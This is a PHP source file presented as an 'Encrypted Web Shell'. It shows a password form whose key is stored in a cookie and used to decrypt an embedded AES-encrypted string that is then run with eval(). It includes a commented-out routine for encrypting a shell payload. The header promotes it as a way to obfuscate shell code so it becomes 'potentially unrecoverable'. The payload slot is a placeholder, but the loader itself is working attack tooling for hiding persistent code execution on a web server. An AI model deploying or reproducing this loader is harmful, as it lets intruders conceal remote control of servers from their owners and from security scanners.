<?php
/**************************
Encrypted Web Shell
Author : kevinnivek
Description : 
This code uses mcrypt to encrpyt raw PHP code (wihtout "<?php ?>").
It then executes the code after decrypting it. This can potentially aid in the obfuscation (and potentially unrecoverable)
of your code, whether its shell, penetration testing or remote management and systems administration.
****************************/

// You can set this manually here in order to encrypt your file the first time. Dont forget to remove after
//$key = '1234567891011120';

define('IV_SIZE', mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

function encrypt($key, $payload) {
  $iv = mcrypt_create_iv(IV_SIZE, MCRYPT_DEV_URANDOM);
  $crypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $payload, MCRYPT_MODE_CBC, $iv);
  $combo = $iv . $crypt;
  $garble = base64_encode($iv . $crypt);
  return $garble;
}

function decrypt($key, $garble) {
  $combo = base64_decode($garble);
  $iv = substr($combo, 0, IV_SIZE);
  $crypt = substr($combo, IV_SIZE, strlen($combo));
  $payload = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $crypt, MCRYPT_MODE_CBC, $iv);
  return $payload;
}

/* Get code to encrypt it
$code_file = file_get_contents('./web-shell.txt');
$code_enc = encrypt($key, $code_file);
*/

if (!empty($_POST['dec'])) {
	// Regardless of what the POST was, set it to the cookie. If it isn't the right key, it wont decrypt anyways :)
        setcookie("dec", $_POST['dec'], time() + 3600);
        $_COOKIE['dec'] = $_POST['dec'];
        header("Refresh:0");
}

if (isset($_COOKIE['dec'])) {
	// If the cookie is set , try decrypting and running
        $key = $_COOKIE['dec'];
	$code = "paste encrypted string here";
        eval(decrypt($key, $code));
} else {
	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
	// Also deliver the input form by default.
        setcookie("dec", "", time() - 3600);
        $_COOKIE['dec'] = null;
        echo '<html><body><form action="encrypted-web-shell.php" method="post">
                <input type="password" autocomplete="off" class="inputtext" name="dec" id="dec">
                <input value="submit" type="submit">
                </form>';
}

?>
